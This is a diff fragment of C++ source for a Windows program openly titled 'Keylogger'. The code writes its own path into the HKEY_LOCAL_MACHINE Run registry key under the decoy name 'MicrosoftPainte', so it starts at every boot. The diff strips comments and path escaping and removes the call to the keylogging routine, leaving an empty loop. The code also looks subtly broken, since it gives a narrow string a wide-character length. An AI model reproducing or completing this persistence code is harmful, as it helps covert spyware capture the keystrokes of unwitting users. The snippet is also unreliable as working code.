@@ -295,11 +295,10 @@ int main()
 
 	 ShowWindow(console, SW_SHOW);
 
-	// Show window
+	
 	system("title Keylogger");
 	string path;
-	wstring newPath = L"";
-// Declarations variables path and newPath => Regedit
+
 	HMODULE hModule = NULL;
 	char Path[MAX_PATH];
 	GetModuleFileNameA(
@@ -309,44 +308,26 @@ int main()
 
 	);
 	path = Path;
-	for (int i = 0; i < path.size(); i++)
-	{
-		if (path[i] == '\\')
-		{
-			newPath += path[i];
-			newPath += path[i];
-		}
-		else
-		{
-			newPath += path[i];
-		}
-	}
-	// Add to the path double slash \\
-
 	HKEY key = NULL;
 	LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE | KEY_READ, &key);
-	// Open Regedit
-	if (res == ERROR_SUCCESS) { // Check if sucess
-		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)newPath.c_str(), (newPath.size()+1) * sizeof(wchar_t));
-		// Write values
+	if (res == ERROR_SUCCESS) {
+		res = RegSetValueEx(key, TEXT("MicrosoftPainte"), 0, REG_SZ, (BYTE *)path.c_str(), (path.size()+1) * sizeof(wchar_t));
 		if (res == ERROR_SUCCESS) {
-			// Print Sucess if it Sucess !
 			cout << "Sucess! \n";
 		}
 		else {
-			// Print Error if it doesn't work
 			cout << "Error! \n";
 		}
 	}
 	else {
-		// If he can't open the register
-		cout << "Not working \n";
+		cout << "Pas bon \n";
 	}
 
 
 	while (true)
 	{
-	// In development
-	Keylogger(100);	
+
+	
+		
 	}
 }
